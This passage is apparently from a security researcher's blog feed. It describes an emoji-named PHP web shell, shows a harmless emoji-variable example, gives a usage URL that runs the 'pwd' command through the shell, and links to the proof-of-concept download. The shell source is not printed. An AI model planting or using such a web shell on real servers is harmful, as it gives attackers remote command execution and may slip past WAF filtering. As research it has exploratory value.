+&lt;p&gt;Link to NCC group research: &lt;a href=&quot;https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/august/singularity-of-origin-a-dns-rebinding-attack-framework/&quot;&gt;Link&lt;/a&gt;&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry><entry><title type="html">Creating an Emojis PHP WebShell</title><link href="https://mazinahmed.net/blog/creating-emojis-php-webshell/" rel="alternate" type="text/html" title="Creating an Emojis PHP WebShell" /><published>2018-07-23T00:00:00-05:00</published><updated>2018-07-23T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/creating-emojis-php-webshell</id><content type="html" xml:base="https://mazinahmed.net/blog/creating-emojis-php-webshell/">&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/static/a276f6eb-bfeb-443e-b6c7-dccfec992f53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I recently came across an interesting behaviour on PHP. Apparently, PHP permits the usage of Unicode characters as variable names. Therefore, friendly emojis can be used as a PHP variable.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$😶&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$😶&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;output&quot;&gt;Output:&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; Hello World!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which is valid.&lt;/p&gt;
+
+&lt;p&gt;I thought about making a fancy example of a PHP Web-Shell using emojis. This is made for entertainment purposes, no real advantage is gained by using Emojis webshell. It may disturb/confuse a WAF or back-end parser, but it’s not confirmed against a real-world environment.&lt;/p&gt;
+
+&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
+
+&lt;p&gt;Usage can be as:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://example.com/emojis-webshell.php?👽=pwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can create a CLI for it to do more; I am only publishing it as a proof of concept.&lt;/p&gt;
+
+&lt;h3 id=&quot;download&quot;&gt;Download&lt;/h3&gt;
+
+&lt;h3 id=&quot;download-emojis-web-shell-link&quot;&gt;[Download] Emojis web-shell: &lt;a href=&quot;https://github.com/mazen160/public/tree/master/Proof-of-Concepts/emojis-webshell&quot;&gt;Link&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><summary type="html"></summary></entry></feed>
